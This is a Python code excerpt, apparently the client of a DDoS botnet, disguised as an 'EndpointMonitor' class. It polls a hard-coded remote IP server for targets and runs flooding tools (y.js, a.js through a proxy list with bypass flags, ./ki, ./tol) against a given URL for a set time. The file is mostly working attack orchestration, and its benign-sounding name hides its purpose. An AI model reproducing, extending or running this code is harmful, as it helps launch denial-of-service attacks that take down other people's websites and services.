...
class EndpointMonitor:
    ...
    def execute_method_1(self, url, time_param, item_key):
        """Execute command for method 1 - node y.js"""
        try:
            time_int = int(time_param)
        except ValueError:
            time_int = 60
            
        command = ["node", "y.js", "GET", url, str(time_int), "4", "90", "--bfm", "--debug"]
    ...
    def execute_method_2(self, url, time_param, item_key):
        """Execute command for method 2 - node a.js with proxy"""
        try:
            time_int = int(time_param)
        except ValueError:
            time_int = 60
            
        command = ["node", "a.js", "GET", url, str(time_int), "4", "90", "proxy.txt", "--bfm", "--debug", "proxy"]
    ...
    def execute_method_3(self, url, time_param, item_key):
        """Execute command for method 3 - ./ki <target> <time> 1 1"""
        try:
            time_int = int(time_param)
        except ValueError:
            time_int = 60
        ...
        # rate=1, threads=1
        command = ["./ki", url, str(time_int), "1", "1"]
    ...
    def execute_method_4(self, url, time_param, item_key):
        """Execute command for method 4 - ./tol <target> <time> 1 1 proxy.txt"""
        try:
            time_int = int(time_param)
        except ValueError:
            time_int = 60
            
        # rate=1, threads=1, proxy.txt constant
        command = ["./tol", url, str(time_int), "1", "1", "proxy.txt"]
...
def main():
    """Main function"""
    BASE_URL = "http://37.221.93.90:3001"
    USERNAME = "team"
    CHECK_INTERVAL = 5
...
if __name__ == "__main__":
    ...
    required_files = ["y.js", "a.js", "ki", "tol"]
    for file in required_files:
        if not os.path.exists(file):
            logging.warning(f"Warning: {file} not found in current directory")
